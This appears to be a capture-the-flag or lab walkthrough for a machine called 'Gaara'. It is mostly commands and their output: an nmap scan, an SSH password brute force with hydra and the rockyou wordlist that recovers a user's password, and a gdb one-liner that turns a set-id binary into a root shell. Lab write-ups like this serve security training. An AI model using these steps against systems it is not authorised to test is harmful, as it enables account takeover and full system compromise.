## MACHINE IP
```bash
192.168.161.142
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Tue Nov  4 14:54:30 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 192.168.161.142
Nmap scan report for 192.168.161.142
Host is up (0.24s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
|   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
|_  256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Gaara
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  4 14:55:31 2025 -- 1 IP address (1 host up) scanned in 61.20 seconds
```
## OPEN PORTS - ANALYSIS
```bash
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```
## ENUMERATION
```bash
# Port 80
- Image of gaara from Naruto
- Fuzzed nothing came up :( 

# Port 22
- Brute force
sudo hydra -l gaara -P /usr/share/wordlists/rockyou.txt -t 16 $ip ssh
[22][ssh] host: 192.168.161.142   login: gaara   password: iloveyou2
  
# Creds
gaara:iloveyou2
```
## INITIAL SHELL
```bash
sudo ssh gaara@$ip
gaara@Gaara:~$ id                        
uid=1001(gaara) gid=1001(gaara) groups=1001(gaara)                                                                                                                                           
gaara@Gaara:~$ whoami                                                                         
gaara                            
```
## PRIVILEGE ESCALATION
```bash
# SUID
find / -perm -g=s -type f 2>/dev/null
/usr/bin/gdb

# Reference GTFOBINS
```
## ROOT | ADMINISTRATOR - PWNED
```bash
gaara@Gaara:~$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# id
uid=1001(gaara) gid=1001(gaara) euid=0(root) egid=0(root) groups=0(root),1001(gaara)
# whoami
root
```
